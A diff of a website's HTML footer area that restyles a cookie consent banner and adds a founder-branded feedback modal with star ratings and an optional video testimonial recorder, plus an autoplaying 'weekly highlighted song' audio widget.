-    <div id="cookie-banner" class="cookie-banner glass-element">
-        <div class="cookie-header">
-            <i class="fa-solid fa-shield-halved"></i>
-            <h4>Secure Privacy & Cookies</h4>
+    <!-- SECURE PRIVACY COOKIE TOP BANNER -->
+    <div id="cookie-banner" class="cookie-banner">
+        <div style="max-width: 1200px; width: 100%; display: flex; align-items: center; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+            <div style="display: flex; align-items: center; gap: 14px;">
+                <i class="fa-solid fa-shield-halved" style="font-size: 1.5rem; color: var(--color-blue);"></i>
+                <div>
+                    <h4 style="font-size: 1.02rem; font-weight: 700; color: var(--text-primary); margin-bottom: 2px;">Secure Privacy & Essential Cookies</h4>
+                    <p style="font-size: 0.82rem; color: var(--text-secondary); margin: 0;">We use essential cookies and telemetry to protect session connections, optimize ProMotion 120Hz speed, and ensure privacy.</p>
+                </div>
+            </div>
+            <div class="cookie-actions" style="display: flex; align-items: center; gap: 10px;">
+                <button id="btn-cookie-accept" class="btn btn-primary hover-interactive" style="padding: 8px 18px; font-size: 0.85rem;">Accept All</button>
+                <button id="btn-cookie-reject" class="btn btn-outline hover-interactive" style="padding: 8px 18px; font-size: 0.85rem;">Decline</button>
+            </div>
+            <div id="cookie-wait-notice" style="display: none; font-size: 0.82rem; font-weight: 700; color: var(--color-blue); width: 100%; text-align: center; margin-top: 4px;">
+                Please wait 3 seconds... <i class="fa-solid fa-spinner fa-spin"></i>
+            </div>
         </div>
-        <p class="cookie-text">
-            We use essential cookies and secure telemetry to protect session connections, optimize high-speed performance, and ensure privacy. Please accept or decline below.
-        </p>
-        <div class="cookie-actions">
-            <button id="btn-cookie-accept" class="btn btn-primary hover-interactive">Accept All</button>
-            <button id="btn-cookie-reject" class="btn btn-outline hover-interactive">Decline</button>
+    </div>
+
+    <!-- FOUNDER & CEO RATING REVIEW MODAL -->
+    <div id="feedback-modal" class="feedback-modal-overlay">
+        <div class="feedback-modal-card glass-element">
+            <button class="feedback-modal-close" onclick="closeFeedbackModal()"><i class="fa-solid fa-xmark"></i></button>
+            
+            <div class="feedback-founder-tag">
+                <i class="fa-solid fa-user-tie"></i> Founder & CEO : Bhupathi Vardhinedi
+            </div>
+            
+            <h2 style="font-size: 1.5rem; margin-bottom: 6px;">Your Experience Matters</h2>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">Please rate our website and share your feedback below.</p>
+            
+            <!-- 1 to 5 Star Rating Selection -->
+            <div class="feedback-stars-row" id="feedback-stars">
+                <i class="fa-solid fa-star active" data-rating="1"></i>
+                <i class="fa-solid fa-star active" data-rating="2"></i>
+                <i class="fa-solid fa-star active" data-rating="3"></i>
+                <i class="fa-solid fa-star active" data-rating="4"></i>
+                <i class="fa-solid fa-star active" data-rating="5"></i>
+            </div>
+            <input type="hidden" id="selected-star-rating" value="5">
+            
+            <!-- Feedback Form -->
+            <form id="feedback-review-form" style="display: flex; flex-direction: column; gap: 14px;">
+                <div class="form-group" style="text-align: left;">
+                    <textarea id="feedback-text-input" placeholder="Write your review or feedback here..." rows="3" required style="width: 100%; padding: 14px 16px; border-radius: var(--radius-md); border: 1px solid rgba(0,0,0,0.08); background: var(--bg-secondary); color: var(--text-primary); outline: none; transition: var(--transition-fast); resize: none;"></textarea>
+                </div>
+
+                <!-- Video Feedback Recorder Toggle Button -->
+                <button type="button" id="btn-toggle-video-rec" class="btn btn-outline btn-block hover-interactive" style="font-size: 0.85rem; padding: 10px 16px;">
+                    <i class="fa-solid fa-video text-blue"></i> Attach Video / Voice Testimonial
+                </button>
+
+                <!-- Interactive Video Recording Container -->
+                <div id="video-rec-container" style="display: none; flex-direction: column; gap: 10px; padding: 14px; border-radius: var(--radius-md); background: var(--bg-secondary); border: 1px solid rgba(0,0,0,0.05);">
+                    <video id="feedback-video-preview" autoplay muted playsinline style="width: 100%; max-height: 180px; border-radius: var(--radius-sm); background: #000; object-fit: cover;"></video>
+                    <div style="display: flex; gap: 10px; justify-content: center;">
+                        <button type="button" id="btn-start-video-rec" class="btn btn-primary" style="padding: 8px 14px; font-size: 0.8rem;">
+                            <i class="fa-solid fa-circle text-red"></i> Start Recording
+                        </button>
+                        <button type="button" id="btn-stop-video-rec" class="btn btn-outline" disabled style="padding: 8px 14px; font-size: 0.8rem;">
+                            <i class="fa-solid fa-stop"></i> Stop
+                        </button>
+                    </div>
+                    <div id="rec-status-text" style="font-size: 0.78rem; color: var(--text-muted); text-align: center;">Click "Start Recording" to capture your video feedback.</div>
+                </div>
+
+                <button type="submit" class="btn btn-primary btn-block hover-interactive" data-cursor="click">
+                    Submit Review <i class="fa-solid fa-paper-plane"></i>
+                </button>
+            </form>
         </div>
+    </div>
+
+    <!-- WEEKLY HIGHLIGHTED SONG MUSIC PLAYER -->
+    <div id="weekly-song-player" class="song-player-widget">
+        <button id="btn-song-play-toggle" class="song-player-btn hover-interactive" data-cursor="click" title="Play / Pause Weekly Highlighted Song">
+            <i class="fa-solid fa-play" id="song-play-icon"></i>
+        </button>
+        <div class="song-info">
+            <span class="song-badge-tag"><i class="fa-solid fa-music"></i> Weekly Highlighted Song</span>
+            <span class="song-title-text">Blinding Lights</span>
+        </div>
+        <audio id="bg-audio-player" src="https://cdns-preview-e.dzcdn.net/stream/c-e95b078971f1146747b594b281c7e909-6.mp3" autoplay loop preload="auto"></audio>
     </div>
 </body>
 </html>
